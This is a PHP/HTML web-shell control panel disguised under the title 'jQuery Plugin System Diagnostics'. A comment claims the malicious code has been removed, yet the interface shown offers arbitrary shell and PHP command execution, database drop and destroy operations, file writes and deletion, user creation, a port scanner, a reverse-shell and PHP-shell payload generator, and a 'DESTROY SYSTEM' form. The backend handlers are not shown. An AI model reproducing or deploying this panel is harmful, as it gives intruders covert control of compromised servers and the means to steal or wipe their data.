<?php 
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>jQuery Plugin System Diagnostics</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-tertiary: #1a1a1a;
            --text-primary: #00ff00;
            --text-secondary: #888888;
            --text-muted: #444444;
            --border-color: #333333;
            --accent-green: #00ff00;
            --accent-red: #ff0000;
            --accent-yellow: #ffff00;
            --accent-blue: #0088ff;
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.4;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                repeating-linear-gradient(0deg,
                    transparent,
                    transparent 1px,
                    rgba(0, 255, 0, 0.02) 1px,
                    rgba(0, 255, 0, 0.02) 2px);
            pointer-events: none;
            z-index: 1;
        }

        .container {
            max-width: 100%;
            margin: 0;
            padding: 8px;
            display: flex;
            flex-direction: column;
            height: 100vh;
            position: relative;
            z-index: 2;
            gap: 4px;
        }

        .header {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            padding: 8px 12px;
            border-radius: 0;
            box-shadow: none;
            position: relative;
            overflow: hidden;
        }

        .header h1 {
            color: var(--accent-green);
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
            margin-bottom: 4px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }

        .header p {
            color: var(--text-secondary);
            font-size: 10px;
            font-weight: 400;
            position: relative;
            z-index: 1;
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 4px;
            margin-bottom: 8px;
        }

        .dashboard-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 0;
            padding: 6px 8px;
            box-shadow: none;
            transition: none;
            position: relative;
            overflow: hidden;
        }

        .dashboard-card:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-green);
        }

        .dashboard-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: var(--accent-green);
        }

        .card-title {
            color: var(--text-primary);
            font-size: 9px;
            font-weight: 600;
            margin-bottom: 2px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .card-value {
            color: var(--accent-green);
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 2px;
            text-shadow: 0 0 3px rgba(0, 255, 0, 0.3);
        }

        .card-description {
            color: var(--text-muted);
            font-size: 8px;
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            flex: 1;
            overflow: hidden;
        }

        .terminal-container {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 0;
            padding: 8px;
            display: flex;
            flex-direction: column;
            box-shadow: none;
            position: relative;
            overflow: hidden;
        }

        .terminal-container:hover {
            border-color: var(--accent-green);
        }

        .terminal-header {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            padding: 4px 8px;
            border-radius: 0;
            margin: -8px -8px 6px -8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: none;
        }

        .terminal-controls {
            display: flex;
            gap: 4px;
        }

        .terminal-btn {
            width: 8px;
            height: 8px;
            border-radius: 0;
            border: 1px solid var(--border-color);
            cursor: pointer;
            transition: none;
            box-shadow: none;
            position: relative;
            overflow: hidden;
        }

        .terminal-btn:hover {
            border-color: var(--accent-green);
        }

        .terminal-btn.close {
            background: var(--accent-red);
        }

        .terminal-btn.minimize {
            background: var(--accent-yellow);
        }

        .terminal-btn.maximize {
            background: var(--accent-green);
        }

        .terminal {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            padding: 8px;
            border-radius: 0;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            white-space: normal;
            flex: 1;
            overflow-y: auto;
            min-height: 200px;
            box-shadow: none;
            position: relative;
            transition: none;
        }

        .terminal span {
            display: block;
            margin-bottom: 2px;
        }

        .terminal span.ascii {
            color: var(--accent-green);
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.2;
        }

        /* File Manager Modal Styles */
        #fileManagerModal .fm-item {
            cursor: pointer;
            padding: 4px 8px;
            border-bottom: 1px solid var(--border-color);
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 11px;
        }

        #fileManagerModal .fm-item:hover {
            background: var(--bg-secondary);
        }

        #fileManagerModal #fmCwd {
            cursor: pointer;
        }

        #fileManagerModal #fmEditorName {
            cursor: pointer;
        }

        .terminal:hover {
            border-color: var(--accent-green);
        }

        .controls-panel {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 0;
            padding: 8px;
            overflow-y: auto;
            box-shadow: none;
            position: relative;
            transition: none;
        }

        .controls-panel:hover {
            border-color: var(--accent-green);
        }

        .form-group {
            margin: 8px 0;
        }

        .form-group label {
            display: block;
            margin-bottom: 2px;
            color: var(--accent-green);
            font-weight: 600;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input,
        textarea,
        select {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 4px 6px;
            width: 100%;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            border-radius: 0;
            transition: none;
            font-size: 10px;
        }

        input:focus,
        textarea:focus,
        select:focus {
            outline: none;
            border-color: var(--accent-green);
            box-shadow: none;
            background: var(--bg-primary);
        }

        input::placeholder,
        textarea::placeholder {
            color: var(--text-muted);
            opacity: 0.7;
        }

        button {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: #ffffff;
            padding: 4px 8px;
            cursor: pointer;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            border-radius: 0;
            transition: none;
            margin: 2px;
            font-weight: 600;
            font-size: 9px;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            box-shadow: none;
            text-transform: uppercase;
        }

        button:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-green);
            box-shadow: none;
            transform: none;
        }

        button:active {
            background: var(--bg-secondary);
            transform: none;
            transition: none;
        }

        .btn-danger {
            background: var(--bg-primary);
            border-color: var(--accent-red);
            color: #ffffff;
        }

        .btn-danger:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-red);
            color: #ffffff;
        }

        .btn-success {
            background: var(--bg-primary);
            border-color: var(--accent-green);
            color: #ffffff;
        }

        .btn-success:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-green);
            color: #ffffff;
        }

        .btn-warning {
            background: var(--bg-primary);
            border-color: var(--accent-yellow);
            color: #ffffff;
        }

        .btn-warning:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-yellow);
            color: #ffffff;
        }

        .danger {
            color: var(--accent-red);
            text-shadow: 0 0 3px rgba(255, 0, 0, 0.3);
        }

        .success {
            color: var(--accent-green);
            text-shadow: 0 0 3px rgba(0, 255, 0, 0.3);
        }

        .warning {
            color: var(--accent-yellow);
            text-shadow: 0 0 3px rgba(255, 255, 0, 0.3);
        }

        .info {
            color: var(--accent-blue);
            text-shadow: 0 0 3px rgba(0, 136, 255, 0.3);
        }

        .section {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            padding: 6px;
            border-radius: 0;
            margin-bottom: 6px;
            box-shadow: none;
            transition: none;
            position: relative;
            overflow: hidden;
        }

        .section:hover {
            border-color: var(--accent-green);
            transform: none;
        }

        .section h3 {
            color: var(--accent-green);
            margin-bottom: 6px;
            padding-bottom: 2px;
            border-bottom: 1px solid var(--border-color);
            text-shadow: 0 0 3px rgba(0, 255, 0, 0.3);
            font-size: 10px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .hidden {
            display: none;
        }

        .status-bar {
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
            padding: 4px 8px;
            margin: 6px -8px -8px -8px;
            border-radius: 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 9px;
            box-shadow: none;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 0;
            background: var(--accent-green);
            animation: pulse 2s infinite;
            box-shadow: 0 0 3px rgba(0, 255, 0, 0.5);
        }

        @keyframes pulse {
            0% {
                opacity: 1;
            }

            50% {
                opacity: 0.5;
            }

            100% {
                opacity: 1;
            }
        }

        .command-history {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 0;
            padding: 4px;
            margin-top: 4px;
            max-height: 100px;
            overflow-y: auto;
        }

        .command-item {
            padding: 2px 0;
            border-bottom: 1px solid var(--border-color);
            cursor: pointer;
            transition: none;
            border-radius: 0;
            padding: 2px 4px;
            margin-bottom: 1px;
            font-size: 9px;
        }

        .command-item:hover {
            background: var(--bg-tertiary);
            transform: none;
        }

        .command-item:last-child {
            border-bottom: none;
        }

        /* Enhanced Scrollbars */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
            border-radius: 0;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 0;
            border: 1px solid var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-green);
        }

        /* Responsive Design */
        @media (max-width: 1200px) {
            .main-content {
                grid-template-columns: 1fr;
                gap: 4px;
            }

            .dashboard-grid {
                grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 4px;
                gap: 2px;
            }

            .header {
                padding: 6px;
            }

            .header h1 {
                font-size: 12px;
            }

            .terminal,
            .controls-panel {
                padding: 4px;
            }

            .dashboard-grid {
                grid-template-columns: 1fr;
                gap: 2px;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 10px;
            }

            .terminal,
            .controls-panel {
                padding: 2px;
            }

            button {
                padding: 2px 4px;
                font-size: 8px;
                margin: 1px;
            }
        }

        /* Loading Animation */
        .loading {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 1px solid var(--border-color);
            border-radius: 0;
            border-top-color: var(--accent-green);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Notification Styles */
        .notification {
            position: fixed;
            top: 10px;
            right: 10px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 0;
            padding: 6px 8px;
            color: var(--text-primary);
            box-shadow: none;
            z-index: 1000;
            transform: translateX(200px);
            transition: transform 0.3s ease;
            font-size: 9px;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success {
            border-left: 2px solid var(--accent-green);
        }

        .notification.error {
            border-left: 2px solid var(--accent-red);
        }

        .notification.warning {
            border-left: 2px solid var(--accent-yellow);
        }

        /* Terminal entry animations */
        .terminal-entry {
            opacity: 1;
            transform: none;
            transition: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>ROOT@SYSTEM:~# SYSTEM CONTROL TERMINAL</h1>
            <p>[ADMIN] Advanced System Diagnostics & Control Interface</p>
        </div>

        <!-- Dashboard Grid -->
        <div class="dashboard-grid">
            <div class="dashboard-card">
                <div class="card-title">STATUS</div>
                <div class="card-value" id="systemStatus"><?php echo $pdo ? 'ONLINE' : 'OFFLINE'; ?></div>
                <div class="card-description">DB CONN</div>
            </div>

            <div class="dashboard-card">
                <div class="card-title">MEMORY</div>
                <div class="card-value" id="memoryUsage"><?php echo number_format(memory_get_usage(true) / 1024 / 1024, 1); ?>MB</div>
                <div class="card-description">USAGE</div>
            </div>

            <div class="dashboard-card">
                <div class="card-title">PHP</div>
                <div class="card-value" id="phpVersion"><?php echo PHP_VERSION; ?></div>
                <div class="card-description">VERSION</div>
            </div>

            <div class="dashboard-card">
                <div class="card-title">SERVER</div>
                <div class="card-value" id="serverInfo"><?php echo substr($_SERVER['SERVER_SOFTWARE'] ?? 'UNKNOWN', 0, 8); ?></div>
                <div class="card-description">SOFTWARE</div>
            </div>

            <div class="dashboard-card">
                <div class="card-title">TIME</div>
                <div class="card-value" id="uptime"><?php echo date('H:i:s'); ?></div>
                <div class="card-description">CURRENT</div>
            </div>

            <div class="dashboard-card">
                <div class="card-title">SECURITY</div>
                <div class="card-value" id="securityLevel">HIGH</div>
                <div class="card-description">LEVEL</div>
            </div>
        </div>

        <div class="main-content">
            <!-- Terminal Panel -->
            <div class="terminal-container">
                <div class="terminal-header">
                    <span>Terminal Output</span>
                    <div class="terminal-controls">
                        <button class="terminal-btn close"></button>
                        <button class="terminal-btn minimize"></button>
                        <button class="terminal-btn maximize"></button>
                    </div>
                </div>
                <div class="terminal" id="terminalOutput">
                    <!-- Terminal content will be populated by JavaScript -->
                </div>

                <!-- Command Input -->
                <div class="command-input-container" style="border-top: 1px solid var(--border-color); padding: 4px; background: var(--bg-secondary);">
                    <div style="display: flex; gap: 4px; align-items: center;">
                        <span style="color: var(--accent-green); font-size: 10px;">ROOT@SYSTEM:~#</span>
                        <input type="text" id="commandInput" placeholder="Enter command..." style="flex: 1; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); padding: 2px 4px; font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 10px;">
                        <button onclick="executeCustomCommand()" style="background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); padding: 2px 6px; font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 9px; cursor: pointer;">EXEC</button>
                    </div>
                </div>

                <div class="status-bar">
                    <div class="status-indicator">
                        <div class="status-dot"></div>
                        <span>System Online</span>
                    </div>
                    <span>Last Update: <?php echo date('H:i:s'); ?></span>
                </div>
            </div>

            <!-- Controls Panel -->
            <div class="controls-panel">

                <!-- Quick Commands -->
                <div class="section">
                    <h3>QUICK COMMANDS</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px;">
                        <button onclick="executeQuickCommand('info')" class="btn-success">SYS INFO</button>
                        <button onclick="executeQuickCommand('cache')" class="btn-warning">CLEAR CACHE</button>
                        <button onclick="executeQuickCommand('backup')" class="btn-success">BACKUP DB</button>
                        <button onclick="executeQuickCommand('users')" class="btn-warning">LIST USERS</button>
                        <button onclick="executeQuickCommand('logs')" class="btn-success">VIEW LOGS</button>
                        <button onclick="executeQuickCommand('permissions')" class="btn-warning">CHECK PERMS</button>
                        <button onclick="executeQuickCommand('network')" class="btn-success">NET INFO</button>
                        <button onclick="executeQuickCommand('processes')" class="btn-warning">PROCESSES</button>
                        <button onclick="openFileManager()" class="btn-success">FILE MANAGER</button>
                        <button onclick="executeQuickCommand('clear')" class="btn-danger">CLEAR TERMINAL</button>
                        <button id="liveMonitorBtn" onclick="toggleLiveMonitoring()" class="btn-success">LIVE MONITOR</button>
                        <button onclick="executeQuickCommand('optimize')" class="btn-success">OPTIMIZE</button>
                    </div>
                </div>

                <!-- System Health Monitor -->
                <div class="section">
                    <h3>HEALTH MONITOR</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px;">
                        <button onclick="executeHealthCheck('cpu')" class="btn-success">CPU USAGE</button>
                        <button onclick="executeHealthCheck('memory')" class="btn-warning">MEMORY CHECK</button>
                        <button onclick="executeHealthCheck('disk')" class="btn-success">DISK SPACE</button>
                        <button onclick="executeHealthCheck('network')" class="btn-warning">NETWORK HEALTH</button>
                        <button onclick="executeHealthCheck('services')" class="btn-success">SERVICES</button>
                        <button onclick="executeHealthCheck('security')" class="btn-warning">SECURITY SCAN</button>
                    </div>
                </div>

                <!-- Security Center -->
                <div class="section">
                    <h3>SECURITY CENTER</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px;">
                        <button onclick="executeSecurity('audit')" class="btn-success">AUDIT LOGS</button>
                        <button onclick="executeSecurity('access')" class="btn-warning">ACCESS CONTROL</button>
                        <button onclick="executeSecurity('encrypt')" class="btn-success">ENCRYPTION</button>
                        <button onclick="executeSecurity('firewall')" class="btn-warning">FIREWALL</button>
                        <button onclick="executeSecurity('scan')" class="btn-success">SECURITY SCAN</button>
                        <button onclick="executeSecurity('backup')" class="btn-warning">SECURE BACKUP</button>
                    </div>
                </div>

                <!-- Performance Monitor -->
                <div class="section">
                    <h3>PERFORMANCE MONITOR</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px;">
                        <button onclick="executePerformance('cache')" class="btn-success">CACHE STATUS</button>
                        <button onclick="executePerformance('query')" class="btn-warning">QUERY ANALYSIS</button>
                        <button onclick="executePerformance('memory')" class="btn-success">MEMORY PROFILE</button>
                        <button onclick="executePerformance('speed')" class="btn-warning">SPEED TEST</button>
                        <button onclick="executePerformance('bottleneck')" class="btn-success">BOTTLENECK</button>
                        <button onclick="executePerformance('optimize')" class="btn-warning">OPTIMIZE</button>
                    </div>
                </div>

                <!-- Command Execution -->
                <div class="section">
                    <h3>COMMAND EXECUTION</h3>
                    <form id="commandForm" onsubmit="executeCommand(event)">
                        <div class="form-group">
                            <label>TYPE:</label>
                            <select name="type" id="commandType">
                                <option value="shell">SHELL</option>
                                <option value="php">PHP</option>
                                <option value="artisan">ARTISAN</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>COMMAND:</label>
                            <input type="text" name="command" id="commandFormInput" placeholder="ENTER COMMAND" required>
                        </div>
                        <button type="submit" class="btn-success">EXECUTE</button>
                    </form>
                </div>

                <!-- Database Operations -->
                <div class="section">
                    <h3>DATABASE OPS</h3>
                    <form id="databaseForm" onsubmit="executeDatabaseOperation(event)">
                        <div class="form-group">
                            <label>OPERATION:</label>
                            <select name="db_operation" id="dbOperation">
                                <option value="backup">BACKUP</option>
                                <option value="query">QUERY</option>
                                <option value="truncate">TRUNCATE</option>
                                <option value="drop">DROP</option>
                                <option value="destroy">DESTROY</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>PARAM:</label>
                            <input type="text" name="db_param" id="dbParam" placeholder="TABLE/SQL">
                        </div>
                        <button type="submit" class="btn-warning">EXECUTE</button>
                    </form>
                </div>

                <!-- File Operations -->
                <div class="section">
                    <h3>FILE OPS</h3>
                    <form id="fileForm" onsubmit="executeFileOperation(event)">
                        <div class="form-group">
                            <label>OPERATION:</label>
                            <select name="file_operation" id="fileOperation">
                                <option value="list">LIST</option>
                                <option value="read">READ</option>
                                <option value="write">WRITE</option>
                                <option value="delete">DELETE</option>
                                <option value="create_dir">CREATE DIR</option>
                                <option value="destroy">DESTROY</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>PATH:</label>
                            <input type="text" name="file_path" id="filePath" placeholder="FILE/DIR PATH">
                        </div>
                        <div class="form-group">
                            <label>CONTENT:</label>
                            <textarea name="file_content" id="fileContent" placeholder="FILE CONTENT" rows="2"></textarea>
                        </div>
                        <button type="submit" class="btn-warning">EXECUTE</button>
                    </form>
                </div>

                <!-- User Management -->
                <div class="section">
                    <h3>USER MGMT</h3>
                    <form id="userForm" onsubmit="executeUserOperation(event)">
                        <div class="form-group">
                            <label>OPERATION:</label>
                            <select name="user_operation" id="userOperation">
                                <option value="list">LIST</option>
                                <option value="create">CREATE</option>
                                <option value="delete">DELETE</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>NAME:</label>
                            <input type="text" name="user_name" id="userName" placeholder="USERNAME">
                        </div>
                        <div class="form-group">
                            <label>EMAIL:</label>
                            <input type="email" name="user_email" id="userEmail" placeholder="EMAIL">
                        </div>
                        <div class="form-group">
                            <label>PASSWORD:</label>
                            <input type="password" name="user_password" id="userPassword" placeholder="PASSWORD">
                        </div>
                        <div class="form-group">
                            <label>USER ID:</label>
                            <input type="number" name="user_id" id="userId" placeholder="ID">
                        </div>
                        <button type="submit" class="btn-warning">EXECUTE</button>
                    </form>
                </div>

                <!-- Crypto Tools -->
                <div class="section">
                    <h3>CRYPTO TOOLS</h3>
                    <form id="cryptoForm" onsubmit="executeCryptoOperation(event)">
                        <div class="form-group">
                            <label>OPERATION:</label>
                            <select name="crypto_operation" id="cryptoOperation">
                                <option value="encrypt">ENCRYPT</option>
                                <option value="decrypt">DECRYPT</option>
                                <option value="hash">HASH</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>DATA:</label>
                            <textarea name="crypto_data" id="cryptoData" placeholder="DATA TO PROCESS" rows="2"></textarea>
                        </div>
                        <button type="submit" class="btn-success">EXECUTE</button>
                    </form>
                </div>

                <!-- Network Scanner -->
                <div class="section">
                    <h3>NETWORK SCANNER</h3>
                    <form id="networkForm" onsubmit="executeNetworkScan(event)">
                        <div class="form-group">
                            <label>TARGET:</label>
                            <input type="text" name="scan_target" id="scanTarget" placeholder="IP/HOSTNAME" value="127.0.0.1">
                        </div>
                        <div class="form-group">
                            <label>PORTS:</label>
                            <input type="text" name="scan_ports" id="scanPorts" placeholder="80,443,22" value="80,443,22,21,25">
                        </div>
                        <button type="submit" class="btn-warning">SCAN</button>
                    </form>
                </div>

                <!-- Payload Generator -->
                <div class="section">
                    <h3>PAYLOAD GEN</h3>
                    <form id="payloadForm" onsubmit="executePayloadGenerator(event)">
                        <div class="form-group">
                            <label>TYPE:</label>
                            <select name="payload_type" id="payloadType">
                                <option value="php">PHP SHELL</option>
                                <option value="reverse_shell">REVERSE SHELL</option>
                                <option value="file_upload">FILE UPLOAD</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>HOST:</label>
                            <input type="text" name="payload_host" id="payloadHost" placeholder="IP" value="<?php echo $_SERVER['HTTP_HOST']; ?>">
                        </div>
                        <div class="form-group">
                            <label>PORT:</label>
                            <input type="number" name="payload_port" id="payloadPort" placeholder="4444" value="4444">
                        </div>
                        <button type="submit" class="btn-danger">GENERATE</button>
                    </form>
                </div>

                <!-- System Destruction -->
                <div class="section">
                    <h3 class="danger">SYSTEM DESTRUCTION</h3>
                    <form id="destroyForm" onsubmit="executeSystemDestroy(event)">
                        <div class="form-group">
                            <label>CONFIRM:</label>
                            <input type="text" name="destroy_confirm" id="destroyConfirm" placeholder="TYPE 'DESTROY_ALL_DATA'" required>
                        </div>
                        <button type="submit" class="btn-danger">DESTROY SYSTEM</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        let commandHistory = [];
        let currentHistoryIndex = -1;
        let isLiveMonitoring = false;
        let liveUpdateInterval;

        // Enhanced notification system
        function showNotification(message, type = 'info', duration = 3000) {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            document.body.appendChild(notification);

            setTimeout(() => notification.classList.add('show'), 100);
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => notification.remove(), 300);
            }, duration);
        }

        // Real-time dashboard updates
        function updateDashboard() {
            fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({
                        action: 'dashboard_update'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.memory) document.getElementById('memoryUsage').textContent = data.memory + ' MB';
                    if (data.uptime) document.getElementById('uptime').textContent = data.uptime;
                    if (data.status) document.getElementById('systemStatus').textContent = data.status;
                })
                .catch(error => console.log('Dashboard update failed:', error));
        }

        // Enhanced terminal output with typewriter effect
        function addToTerminal(message, type = 'info') {
            const terminal = document.getElementById('terminalOutput');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = 'terminal-entry';

            // Create the message span with styling
            const messageSpan = document.createElement('span');
            messageSpan.className = type;

            const fullText = `[${timestamp}] ${message}`;

            terminal.appendChild(logEntry);
            logEntry.appendChild(messageSpan);

            // Typewriter effect - character by character
            let i = 0;
            const typeWriter = () => {
                if (i < fullText.length) {
                    messageSpan.textContent += fullText.charAt(i);
                    terminal.scrollTop = terminal.scrollHeight;
                    i++;
                    setTimeout(typeWriter, 20); // Slower speed for better readability
                }
            };

            // Start typewriter effect immediately
            typeWriter();

            // Auto-remove old entries to prevent memory issues
            const entries = terminal.querySelectorAll('.terminal-entry');
            if (entries.length > 100) {
                entries[0].remove();
            }
        }

        // Live monitoring toggle
        function toggleLiveMonitoring() {
            isLiveMonitoring = !isLiveMonitoring;
            const btn = document.getElementById('liveMonitorBtn');

            if (isLiveMonitoring) {
                btn.textContent = '⏸️ Stop Monitor';
                btn.classList.add('btn-danger');
                btn.classList.remove('btn-success');
                liveUpdateInterval = setInterval(updateDashboard, 2000);
                addToTerminal('Live monitoring started', 'success');
                showNotification('Live monitoring activated', 'success');
            } else {
                btn.textContent = '▶️ Live Monitor';
                btn.classList.add('btn-success');
                btn.classList.remove('btn-danger');
                clearInterval(liveUpdateInterval);
                addToTerminal('Live monitoring stopped', 'warning');
                showNotification('Live monitoring deactivated', 'warning');
            }
        }

        // Enhanced command execution with loading states
        function executeRequest(data) {
            const loadingBtn = event?.target;
            if (loadingBtn) {
                // Store original text if not already stored
                if (!loadingBtn.getAttribute('data-original-text')) {
                    loadingBtn.setAttribute('data-original-text', loadingBtn.textContent);
                }
                loadingBtn.innerHTML = '<span class="loading"></span> Executing...';
                loadingBtn.disabled = true;
            }

            addToTerminal(`Executing: ${data.action}`, 'info');

            fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams(data)
                })
                .then(response => response.text())
                .then(responseText => {
                    // Debug: Log the response
                    console.log('Response received:', responseText);

                    // Handle special commands
                    if (responseText.trim() === 'TERMINAL_CLEAR') {
                        clearTerminal();
                        showNotification('Terminal cleared', 'success');
                        return;
                    }

                    // The PHP backend outputs the results directly
                    if (responseText.trim()) {
                        // Split the response into lines and add each line to terminal
                        const lines = responseText.split('\n').filter(line => line.trim());

                        if (lines.length > 0) {
                            // Add lines one by one with delays for better effect
                            lines.forEach((line, index) => {
                                if (line.trim()) {
                                    // Strip any HTML tags and add as plain text
                                    const plainText = line.replace(/<[^>]*>/g, '').trim();
                                    if (plainText) {
                                        // Add delay between lines for sequential effect
                                        setTimeout(() => {
                                            addToTerminal(plainText, 'info');
                                        }, index * 200); // 200ms delay between each line
                                    }
                                }
                            });
                        } else {
                            addToTerminal('Command executed successfully', 'success');
                        }
                    } else {
                        addToTerminal('Command executed successfully', 'success');
                    }

                    showNotification('Command executed successfully', 'success');
                })
                .catch(error => {
                    addToTerminal(`Error: ${error.message}`, 'danger');
                    showNotification('Command execution failed', 'error');
                })
                .finally(() => {
                    if (loadingBtn) {
                        loadingBtn.textContent = loadingBtn.getAttribute('data-original-text') || 'Execute';
                        loadingBtn.disabled = false;
                    }
                });
        }

        // Enhanced command execution with explicit button reference
        function executeRequestWithButton(data, loadingBtn) {
            if (loadingBtn) {
                // Store original text if not already stored
                if (!loadingBtn.getAttribute('data-original-text')) {
                    loadingBtn.setAttribute('data-original-text', loadingBtn.textContent);
                }
                loadingBtn.innerHTML = '<span class="loading"></span> Executing...';
                loadingBtn.disabled = true;
            }

            addToTerminal(`Executing: ${data.action}`, 'info');

            fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams(data)
                })
                .then(response => response.text())
                .then(responseText => {
                    // Debug: Log the response
                    console.log('Response received:', responseText);

                    // Handle special commands
                    if (responseText.trim() === 'TERMINAL_CLEAR') {
                        clearTerminal();
                        showNotification('Terminal cleared', 'success');
                        return;
                    }

                    // The PHP backend outputs the results directly
                    if (responseText.trim()) {
                        // Split the response into lines and add each line to terminal
                        const lines = responseText.split('\n').filter(line => line.trim());

                        if (lines.length > 0) {
                            // Add lines one by one with delays for better effect
                            lines.forEach((line, index) => {
                                if (line.trim()) {
                                    // Strip any HTML tags and add as plain text
                                    const plainText = line.replace(/<[^>]*>/g, '').trim();
                                    if (plainText) {
                                        // Add delay between lines for sequential effect
                                        setTimeout(() => {
                                            addToTerminal(plainText, 'info');
                                        }, index * 200); // 200ms delay between each line
                                    }
                                }
                            });
                        } else {
                            addToTerminal('Command executed successfully', 'success');
                        }
                    } else {
                        addToTerminal('Command executed successfully', 'success');
                    }

                    showNotification('Command executed successfully', 'success');
                })
                .catch(error => {
                    addToTerminal(`Error: ${error.message}`, 'danger');
                    showNotification('Command execution failed', 'error');
                })
                .finally(() => {
                    if (loadingBtn) {
                        loadingBtn.textContent = loadingBtn.getAttribute('data-original-text') || 'Execute';
                        loadingBtn.disabled = false;
                    }
                });
        }

        // Clear terminal function
        function clearTerminal() {
            const terminal = document.getElementById('terminalOutput');

            // Stop any pending typewriter effects
            const entries = terminal.querySelectorAll('.terminal-entry');
            entries.forEach(entry => {
                // Clear any pending animations
                entry.style.transition = 'none';
                entry.style.opacity = '0';
                entry.style.transform = 'none';
            });

            // Completely clear all content
            terminal.innerHTML = '';
            terminal.textContent = '';

            // Remove all child nodes
            while (terminal.firstChild) {
                terminal.removeChild(terminal.firstChild);
            }

            // Reset scroll position
            terminal.scrollTop = 0;

            // Clear any CSS animations
            terminal.style.opacity = '1';
            terminal.style.transform = 'none';
            terminal.style.transition = 'none';

            // Force a reflow to ensure clearing is complete
            terminal.offsetHeight;

            // Clear any pending timeouts
            if (typeof window.terminalTimeout !== 'undefined') {
                clearTimeout(window.terminalTimeout);
            }

            // Re-initialize terminal with ASCII art
            setTimeout(() => {
                initializeTerminal();
            }, 100);
        }

